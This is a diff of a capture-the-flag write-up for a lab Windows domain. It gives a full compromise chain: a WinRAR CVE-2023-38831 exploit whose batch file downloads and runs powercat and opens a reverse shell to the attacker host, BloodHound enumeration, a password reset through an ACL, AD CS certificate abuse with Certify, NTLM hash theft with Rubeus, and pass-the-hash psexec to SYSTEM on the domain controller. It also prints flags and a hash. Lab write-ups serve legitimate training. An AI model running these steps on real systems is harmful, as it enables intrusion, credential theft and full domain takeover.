@@ -184,7 +184,7 @@ Web service running on port 80 requires windows authentication. We don't current
 Web service on port 8000 appears to be a file hosting application. It, too, requires authentication. 
 ![Alt text](Screenshots/file-hosting-landing.png)
 
-However, attempting simple admin:admin let's us in. 
+However, attempting simple admin:admin lets us in. 
 ![Alt text](Screenshots/file-hosting-dashboard-2.png)
 
 We can upload, download, edit any type of file. 
@@ -194,7 +194,7 @@ Moreover, developers left a note for us.
 Please note that if you upload archive files, our application will unarchive and check for possible viruses. 
 ```
 
-
+### Getting a shell as web_svc
 If the application is unarchiving our compressed files and the system has a vulnerable WinRAR version installed, we can attempt to upload an exploit and test if it opens our exploit. For that we will search for public exploits of [CVE-2023-38831](https://github.com/b1tg/CVE-2023-38831-winrar-exploit).
 
 Clone the repo. 
@@ -216,7 +216,7 @@ Change the script.bat accordingly and prepare the exploit.
 ```
 ┌──(kali㉿kali)-[~/Captivity/CVE-2023-38831-winrar-exploit]
 └─$ cat script.bat                  
-powershell.exe -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.100.130/powercat.ps1'); powercat -c 192.168.100.130 -p 443 -e powershell"
+powershell.exe -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.100.132/powercat.ps1'); powercat -c 192.168.100.132 -p 443 -e powershell"
 
 ┌──(kali㉿kali)-[~/Captivity/CVE-2023-38831-winrar-exploit]
 └─$ python cve-2023-38831-exp-gen.py CLASSIFIED_DOCUMENTS.pdf script.bat exploit.rar
@@ -283,8 +283,425 @@ PS C:\Apps\Parser>
 
 
 
+### Enumerating The Domain
+The user we have access to is a standard domain user with minimal permissions. Therefore, we should find ways to escalate our privileges. In domain environments, privilege escalation can be achieved in one of two ways: exploiting a misconfiguration in the domain or escalating locally. Let's start with the former. 
+
+To enumerate the domain, we will use [Bloodhound](https://github.com/BloodHoundAD/BloodHound). BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. 
+
+[SharpHound](https://github.com/BloodHoundAD/SharpHound) is a data collector for BloodHound. We will collect information about domain objects via SharpHound and analyze it using BloodHound. 
+
+```
+PS C:\windows\tasks> iwr -uri http://192.168.100.132/SharpHound.exe -o SharpHound.exe
+
+PS C:\windows\tasks> .\SharpHound.exe
+.\SharpHound.exe
+2023-10-02T04:41:49.1924360-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+...
+2023-10-02T04:42:32.6453308-07:00|INFORMATION|SharpHound Enumeration Completed at 4:42 AM on 10/2/2023! Happy Graphing!
+```
+
+Now, we need to transfer the output file to our kali machine. 
+
+Start SMB server on kali:
+ ```
+ ┌──(kali㉿kali)-[~/Captivity]
+└─$ impacket-smbserver -smb2support share . -username kali -password kali 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+```
+
+Mount the share on victim machine:
+```
+PS C:\Windows\tasks> net use f: \\192.168.100.132\share /user:kali kali /persistent:yes
+net use f: \\192.168.100.132\share /user:kali kali /persistent:yes
+The command completed successfully.
+```
+And copy SharpHound output to the mounted folder. 
+```
+PS C:\windows\tasks> cp 20231002044231_BloodHound.zip f:\
+cp 20231002044231_BloodHound.zip f:\
+```
+
+If this is your first time setting up BloodHound, please refer to [this link](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux).
+
+
+Now, import the data (20231002044231_BloodHound.zip) by drag and dropping.  
+
+### Finding Vulnerable Domain Objects via BloodHound Analysis
+
+Bloodhound is a great tool to analyze domain object relations and possibly find misconfigurations. For example, in the analysis section we can find many pre-built queries that find known mistakes done by system admins.
+
+![Alt text](Screenshots/bloodhound-analysis.png)
+
+One of these queries is titled 'Find All Paths from Domain Users to High Value Targets.' This query reveals that, as an authenticated user, we have fullControl permissions over the 'ca_admin' user. Full control permission allows us to perform various actions on user account settings, such as adding it to groups, resetting the password, and even deleting the object.
+
+![Alt text](Screenshots/bloodhound-shortest-path-2.png)
+
+Let's reset the user's password using the built-in 'net user' utility.
+
+```
+PS C:\windows\tasks> net user ca_admin Passw0rd123!@# /domain
+net user ca_admin Passw0rd123!@# /domain
+The command completed successfully.
+```
+
+We have gained access to the machine as the 'ca_admin' user!
+```
+┌──(kali㉿kali)-[~/Captivity]
+└─$ evil-winrm -u ca_admin -p 'Passw0rd123!@#' -i 192.168.100.130        
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ca_admin\Documents> whoami
+capt\ca_admin
+*Evil-WinRM* PS C:\Users\ca_admin\Documents> type C:\Users\ca_admin\Desktop\user2.txt
+ICSD{d6e5f1a95e337951476ec27672868aa1}
+```
+
+### Certificate Authority Admins Group
+ca_admin is a member of 'CAPT\Certificate Authority Admins,' indicating that Active Directory Certificate Services may be installed. We can verify this using the 'Get-WindowsFeature' cmdlet.
+
+```
+*Evil-WinRM* PS C:\Users\ca_admin\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                           Attributes
+=========================================== ================ ============================================= ==================================================
+Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+CAPT\Certificate Authority Admins           Group            S-1-5-21-541188004-2695660962-2805497550-1105 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+```
+
+```
+PS C:\windows\tasks> Get-WindowsFeature -Name ADCS-Cert-Authority
+Get-WindowsFeature -Name ADCS-Cert-Authority
+
+Display Name                                            Name                       Install State
+------------                                            ----                       -------------
+    [X] Certification Authority                         ADCS-Cert-Authority            Installed
+
+```
+
+There are [many ways](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation) to escalate via AD CS in a domain. 
+
+
+To interact with AD CS, we will use a great open source tool [Certify](https://github.com/GhostPack/Certify) by [harmj0y](https://twitter.com/harmj0y) and [tifkin_](https://twitter.com/tifkin_). The '/vulnerable' option checks for misconfigured certificate templates; however, we didn't find any. Nevertheless, since we are a member of 'Certificate Authority Admins,' we may have permissions to issue another certificate or modify certificate permissions.
+
+```
+*Evil-WinRM* PS C:\Users\ca_admin\Documents> .\certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=capt,DC=org'
+
+[*] Listing info about the Enterprise CA 'capt-ca'
+
+    Enterprise CA Name            : capt-ca
+    DNS Hostname                  : dc01.capt.org
+    FullName                      : dc01.capt.org\capt-ca
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=capt-ca, DC=capt, DC=org
+    Cert Thumbprint               : 829C336B788EBB4A8602C061BD75CEF024BB61B6
+    Cert Serial                   : 1D6245C40897D6A5438655E8FBA16DA1
+    Cert Start Date               : 9/19/2023 10:58:01 AM
+    Cert End Date                 : 9/19/2028 11:08:01 AM
+    Cert Chain                    : CN=capt-ca,DC=capt,DC=org
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+      Allow  ManageCA, ManageCertificates               CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+    Enrollment Agent Restrictions : None
+
+[+] No Vulnerable Certificates Templates found!
 
 
 
+Certify completed in 00:00:00.5201741
+```
+
+In the context of escalation, we are interested in certificate templates where we can specify the user for whom the certificate is issued. This is achieved through the 'enrolleeSuppliesSubject' attribute in the certificate template object. 
+
+```
+*Evil-WinRM* PS C:\Users\ca_admin\Documents> .\certify.exe find /enrolleeSuppliesSubject
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=capt,DC=org'
+
+[*] Listing info about the Enterprise CA 'capt-ca'
+
+    Enterprise CA Name            : capt-ca
+    DNS Hostname                  : dc01.capt.org
+    FullName                      : dc01.capt.org\capt-ca
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=capt-ca, DC=capt, DC=org
+    Cert Thumbprint               : 829C336B788EBB4A8602C061BD75CEF024BB61B6
+    Cert Serial                   : 1D6245C40897D6A5438655E8FBA16DA1
+    Cert Start Date               : 9/19/2023 10:58:01 AM
+    Cert End Date                 : 9/19/2028 11:08:01 AM
+    Cert Chain                    : CN=capt-ca,DC=capt,DC=org
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+      Allow  ManageCA, ManageCertificates               CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+    Enrollment Agent Restrictions : None
+Enabled certificate templates where users can supply a SAN:
+    CA Name                               : dc01.capt.org\capt-ca
+    Template Name                         : WebServer
+    Schema Version                        : 1
+    Validity Period                       : 2 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+      Object Control Permissions
+        Owner                       : CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+        WriteOwner Principals       : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+        WriteDacl Principals        : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+        WriteProperty Principals    : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+
+    CA Name                               : dc01.capt.org\capt-ca
+    Template Name                         : SubCA
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : <null>
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+      Object Control Permissions
+        Owner                       : CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+        WriteOwner Principals       : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+        WriteDacl Principals        : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+        WriteProperty Principals    : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+
+    CA Name                               : dc01.capt.org\capt-ca
+    Template Name                         : CAPTUser
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : CAPT\Certificate Authority AdminsS-1-5-21-541188004-2695660962-2805497550-1105
+                                      CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+      Object Control Permissions
+        Owner                       : CAPT\Administrator            S-1-5-21-541188004-2695660962-2805497550-500
+        WriteOwner Principals       : CAPT\Administrator            S-1-5-21-541188004-2695660962-2805497550-500
+                                      CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+        WriteDacl Principals        : CAPT\Administrator            S-1-5-21-541188004-2695660962-2805497550-500
+                                      CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
+        WriteProperty Principals    : CAPT\Administrator            S-1-5-21-541188004-2695660962-2805497550-500
+                                      CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
+                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
 
 
+
+Certify completed in 00:00:00.2955174
+*Evil-WinRM* PS C:\Users\ca_admin\Documents> 
+```
+While searching for such templates, we discovered three: WebServer, SubCA, and CAPTUser. We lack the permissions to enroll in the first two, but the third one grants enroll permission in its DACL for 'CAPT\Certificate Authority Admins.' This essentially enables us to request a certificate on behalf of anyone, including the domain admins.
+
+```
+*Evil-WinRM* PS C:\Users\ca_admin\Documents> .\certify.exe request /ca:dc01.capt.org\capt-ca /template:CAPTUser /altname:administrator
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : CAPT\ca_admin
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : CAPTUser
+[*] Subject                 : CN=ca_admin, CN=Users, DC=capt, DC=org
+[*] AltName                 : administrator
+
+[*] Certificate Authority   : dc01.capt.org\capt-ca
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 6
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAuBz<snip>Y3wiJ6DqsSI=
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIF+DCCBOCgAwIBAgI<snip>hffQWo+HLkM=
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+
+
+Certify completed in 00:00:03.9105071
+```
+
+Convert the certificate. 
+```
+┌──(kali㉿kali)-[~/Captivity]
+└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Enter Export Password:
+Verifying - Enter Export Password:
+```
+
+Now, we are using Rubeus to request a TGT for the administrator user. While we could pass the generated ticket to our session, we will instead utilize /getcredentials and /show options to obtain the hash of the administrator user.
+
+
+```
+*Evil-WinRM* PS C:\Users\ca_admin\Documents> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.0
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=ca_admin, CN=Users, DC=capt, DC=org
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'capt.org\administrator'
+[*] Using domain controller: fe80::ecab:8748:e39b:fbc6%9:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGND<snip>2FwdC5vcmc=
+
+  ServiceName              :  krbtgt/capt.org
+  ServiceRealm             :  CAPT.ORG
+  UserName                 :  administrator (NT_PRINCIPAL)
+  UserRealm                :  CAPT.ORG
+  StartTime                :  10/2/2023 6:13:05 AM
+  EndTime                  :  10/2/2023 4:13:05 PM
+  RenewTill                :  10/9/2023 6:13:05 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  4gK9U+F3PpFv2d/ur5idiA==
+  ASREP (key)              :  0407283069E3DC709AF52D95B1BF9224
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 26667245871373BA27C81CC4ACBB84C9
+```
+
+Use psexec to login to the machine. 
+
+```
+┌──(kali㉿kali)-[~/Captivity]
+└─$ impacket-psexec Administrator@192.168.100.130 -hashes :26667245871373BA27C81CC4ACBB84C9
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.100.130.....
+[*] Found writable share ADMIN$
+[*] Uploading file bRwjLWHm.exe
+[*] Opening SVCManager on 192.168.100.130.....
+[*] Creating service QOHX on 192.168.100.130.....
+[*] Starting service QOHX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.587]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+dc01
+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+ICSD{90fe25002f1e949719f6fa398c8a7374}
+
+C:\Windows\system32> 
+```
